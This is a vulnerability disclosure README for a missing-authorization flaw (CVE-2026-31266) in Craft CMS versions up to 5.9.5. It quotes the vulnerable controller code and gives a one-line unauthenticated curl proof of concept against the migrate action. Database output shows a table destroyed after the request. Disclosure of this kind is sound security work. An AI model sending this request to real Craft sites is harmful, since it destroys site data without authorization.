# CVE-2026-31266 - Craft CMS Missing Authorization

## CVE Information
| Field | Value |
|-------|-------|
| **CVE ID** | CVE-2026-31266 |
| **Vendor** | Pixel & Tonic |
| **Product** | Craft CMS |
| **Affected Versions** | <= 5.9.5 |
| **CWE** | CWE-862 (Missing Authorization) |
| **CVSS** | 6.5 (Medium) |
| **Security Researcher** | 0xRIXET |

## Evidence Contents
- `screenshots/` - Proof of Concept demonstrations


## Vulnerability
- **Type:** Missing Authorization
- **Impact:** Authentication Bypass
- **Vendor:** Craft CMS
- **Status:** CVE-2026-31266

## Vulnerable Code

**File:** `src/controllers/AppController.php`

**Lines 65-68:**
```php
protected array|bool|int $allowAnonymous = [
    'migrate' => self::ALLOW_ANONYMOUS_LIVE | self::ALLOW_ANONYMOUS_OFFLINE,
];
```

## Proof of Concept

```bash
# With allowAdminChanges=false
curl -X POST "http://target/actions/app/migrate"
```

## Evidence

### Before Attack:
```sql
mysql> SELECT COUNT(*) FROM sessions;
+----------+
| COUNT(*) |
+----------+
|        0 |
+----------+
```

### After Attack:
```sql
mysql> SELECT COUNT(*) FROM sessions;
ERROR 1146 (42S02): Table 'sessions' doesn't exist
```

## References
- [Craft CMS Repository](https://github.com/craftcms/cms)
- [Craft Security Documentation](https://craftcms.com/knowledge-base/securing-craft)
- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2026-31266) *(pending)*

## Contact
- **Security Researcher:** 0xRIXET
- **Twitter | X :** @0xRIXET
- **Email:** 0xrixet@gmail.com
